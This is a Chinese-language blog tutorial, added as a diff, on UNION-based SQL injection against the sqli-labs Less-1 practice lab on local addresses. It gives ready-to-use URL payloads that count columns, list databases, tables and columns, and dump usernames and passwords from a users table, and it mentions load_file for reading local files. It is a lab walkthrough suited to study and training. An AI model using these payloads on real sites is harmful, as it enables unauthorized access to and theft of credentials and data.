@@ -1,0 +1,56 @@
+<h1 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h1><h3 id="一、原理及手工注入"><a href="#一、原理及手工注入" class="headerlink" title="一、原理及手工注入"></a>一、原理及手工注入</h3><hr>
+<p>三个条件：</p>
+<ol>
+<li>两个表的<code>列数相同</code>​，并且相应的列具有<code>相似的数据类型</code>​。</li>
+<li>查询结果<code>回显</code>​。</li>
+<li>存在注入漏洞。</li>
+</ol>
+<p>我们可以通过<code>order by</code>​来判断当前表的列数。</p>
+<pre><code>http://192.168.209.128:88/Less-1/?id=1&#39;  order by 4-- qwq
+</code></pre>
+<p>4 时错误，3 时正确，可得知，当前表有 3 列</p>
+<p><img src="/assets/image-20250519090453-q9nevqk.png" alt="image"></p>
+<p><img src="/assets/image-20250519090456-ziat5np.png" alt="image"></p>
+<p>通过union union查询来知道显示的列数。</p>
+<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1 ,2 ,3 -- qwq</code>​</p>
+<p><img src="/assets/image-20250519091423-lg6slw8.png" alt="image"></p>
+<p>我们union查询的就显示出来了。可知，第 2 列和第 3 列是回显列。那我们就可以在这两个位置插入一些函数了。</p>
+<pre><code>version():查询数据库的版本
+user():查询数据库的使用者
+database():数据库
+system_user():系统用户名
+session_user():连接数据库的用户名
+current_user:当前用户名
+load_file:读取本地文件
+@@datadir:读取数据库路径
+@@basedir:mysql安装路径
+@@version_complie_os:查看操作系统
+</code></pre>
+<p>开始注入脚本</p>
+<pre><code class="language-bash">//回显出数据库版本信息、数据库所在路径
+http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1,version(),@@datadir -- qwq
+//更多自行尝试
+。。。。。。
+</code></pre>
+<p><img src="/assets/image-20250519091530-mom8i84.png" alt="image"></p>
+<p>我们还可以通过 union 注入获得更多的信息。</p>
+<pre><code class="language-bash">// 获得所有的数据库
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+
+
+// 获得所有的表
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables--+
+
+// 获得所有的列
+http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns --+
+</code></pre>
+<p>通过select 1,database(),3…，得出当前数据库名security，我们就可以通过下面的语句得到当前数据库的所有的表。</p>
+<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- +</code>​</p>
+<p><img src="/assets/image-20250519091738-nbcnr9w.png" alt="image"></p>
+<p>我们知道了当前数据库中存在了四个表，那么我们可以通过下面的语句知道每个表中的列。</p>
+<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; -- +</code>​</p>
+<p>如下，我们可以知道 users 表中有 id，username，password 三列</p>
+<p><img src="/assets/image-20250519091812-sx9wpg1.png" alt="image"></p>
+<p>使用 group_concat()拼接账号密码还有 id，即可爆出所有数据</p>
+<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users -- +</code>​</p>
+<p><img src="/assets/image-20250519091835-7te350s.png" alt="image"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
